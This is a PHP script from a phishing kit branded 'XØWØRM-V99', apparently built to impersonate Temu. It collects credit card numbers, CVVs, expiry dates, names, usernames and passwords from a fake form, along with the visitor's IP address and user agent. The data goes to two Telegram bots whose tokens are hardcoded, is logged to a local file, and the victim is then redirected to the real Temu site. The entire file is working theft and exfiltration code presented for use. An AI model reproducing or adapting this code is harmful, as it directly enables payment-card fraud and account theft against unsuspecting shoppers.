<?php
// ============================================
// ⚔️ XØWØRM-V99 👹 DUAL TELEGRAM BOT CONFIGURATION
// ============================================

// BOT 1 — Primary Collector
$telegram_token_1 = "AAEzLsojkX20P2HrqPY0CGJvcTwkcZDcewk";
$chat_id_1 = "6036275568";

// BOT 2 — Secondary Collector  
$telegram_token_2 = "AAE0MHqMFEuvgPcrExGb64RCAoxnl0Q45ms";
$chat_id_2 = "7087174244";

// ============================================
// Collect all form data
// ============================================
$fullName    = isset($_POST['fullName'])    ? $_POST['fullName']    : '';
$cardNumber  = isset($_POST['cardNumber'])  ? $_POST['cardNumber']  : '';
$expDate     = isset($_POST['expDate'])     ? $_POST['expDate']     : '';
$cvv         = isset($_POST['cvv'])         ? $_POST['cvv']         : '';
$cardName    = isset($_POST['cardName'])    ? $_POST['cardName']    : '';

// Also capture username/password from 1.html if present
$username    = isset($_POST['username'])    ? $_POST['username']    : '';
$password    = isset($_POST['password'])    ? $_POST['password']    : '';

// Get visitor IP and User-Agent
$ip          = $_SERVER['REMOTE_ADDR'];
$userAgent   = $_SERVER['HTTP_USER_AGENT'];
$timestamp   = date('Y-m-d H:i:s');

// ============================================
// Build the message — includes ALL captured data
// ============================================
$message = "
═══════════════════════════════
      💳 XØWØRM-V99 CAPTURE
═══════════════════════════════

【 CREDIT CARD DATA 】
👤 Full Name    : $fullName
💳 Card Number  : $cardNumber
📅 Expiry Date  : $expDate
🔒 CVV          : $cvv
🏦 Card Name    : $cardName

【 LOGIN DATA (if any) 】
📧 Username     : $username
🔑 Password     : $password

【 VICTIM INFO 】
🌐 IP Address   : $ip
🕐 Timestamp    : $timestamp
📱 User Agent   : $userAgent
═══════════════════════════════
";

// ============================================
// Function to send to a single Telegram bot
// ============================================
function sendToTelegram($token, $chat_id, $message) {
    $telegramUrl = "https://api.telegram.org/bot{$token}/sendMessage";
    
    $data = [
        'chat_id'                  => $chat_id,
        'text'                     => $message,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// ============================================
// Send to BOTH Telegram bots
// ============================================
sendToTelegram($telegram_token_1, $chat_id_1, $message);
sendToTelegram($telegram_token_2, $chat_id_2, $message);

// ============================================
// Optional: Log to local file for backup
// ============================================
$log_entry = "[$timestamp] IP: $ip | Name: $fullName | Card: $cardNumber | Exp: $expDate | CVV: $cvv | User: $username | Pass: $password\n";
file_put_contents('captured_data.log', $log_entry, FILE_APPEND);

// ============================================
// Redirect the victim to legitimate Temu
// ============================================
header('Location: https://www.temu.com');
exit;
?>